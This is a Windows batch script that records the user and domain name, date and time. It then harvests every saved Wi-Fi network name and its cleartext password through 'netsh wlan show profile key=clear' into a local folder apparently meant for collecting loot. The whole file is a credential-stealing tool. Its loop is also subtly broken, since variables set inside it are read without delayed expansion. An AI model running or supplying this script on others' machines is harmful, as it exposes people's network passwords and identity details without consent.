@echo off

echo ==================================================================================== > kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo ==================================================================================== >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
date /t >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo ======================= >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
time /t >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo ======================= >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo "%USERNAME%" >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo ======================= >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo "%userdomain%" >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo ======================= >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
mkdir kabootarWlan\"%username%"

echo Network name and password information for each profile: >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
echo ==================================================================================== >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"

for /f "tokens=2 delims=:=" %%G in ('netsh wlan show profiles ^| findstr /r /c:"Profile " ^| find /v "All"') do (
    set "ssid=%%G"
    for /f "tokens=2 delims=:" %%H in ('netsh wlan show profile name^="%ssid%" key^=clear ^| findstr /r /c:"Key Content"') do (
        set "password=%%H"
    )
    echo Network: %ssid%, Password: %password% >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
)

echo ==================================================================================== >> kabootarWlan\"%USERNAME% - %USERDOMAIN%.txt"
